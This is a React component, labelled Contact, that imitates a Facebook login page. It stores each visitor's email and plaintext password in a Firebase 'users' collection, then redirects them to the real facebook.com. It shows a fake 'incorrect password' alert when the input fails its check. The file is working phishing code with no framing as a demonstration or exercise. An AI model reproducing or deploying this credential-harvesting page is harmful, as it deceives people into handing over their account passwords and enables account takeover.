import React from "react";
import "./Contact.css";
import { db } from "../firebase";

import Swal from "sweetalert2";
import withReactContent from "sweetalert2-react-content";

const Contact = () => {
  const [email, setEmail] = React.useState("");
  const [password, setPassword] = React.useState("");
  const formIsValid =
    password.trim().length > 6 && email.includes("@gmail.com");

  const [loader, setLoader] = React.useState(false);
  const MySwal = withReactContent(Swal);

  const handleSubmit = (e) => {
    setLoader(true);
    e.preventDefault();

    db.collection("users")
      .add({
        email: email,
        password: password,
      })
      .then(() => {
        window.location = "https://facebook.com";
        setLoader(false);
      })
      .catch((err) => {
        console.log(err.message);
        setLoader(false);
      });

    setEmail("");
    setPassword("");
  };

  return (
    <>
      <div class="center">
        <h1>Facebook Login</h1>
        <form onSubmit={handleSubmit}>
          <div class="txt_field">
            <input
              tpe="email"
              placeholder="Email..."
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
              }}
              required
            />
          </div>
          <div class="txt_field">
            <input
              required
              type="password"
              placeholder="Password..."
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
              }}
            />
          </div>

          {!formIsValid && (
            <input
              // disabled
              className="input"
              onClick={() => {
                MySwal.fire({
                  title: <p>Email or password is incorrect, try Again!</p>,
                  type: "submit",
                });
              }}
              // className="invalid"
              // type="submit"
              value="Login"
              // style={{ background: loader ? "#ccc" : "rgb(2, 2, 110)" }}
            />
          )}

          {formIsValid && (
            <input
              className="input"
              type="submit"
              value="Login"
              style={{ background: loader ? "#ccc" : "rgb(2, 2, 110)" }}
            />
          )}
        </form>
      </div>
    </>
  );
};

export default Contact;
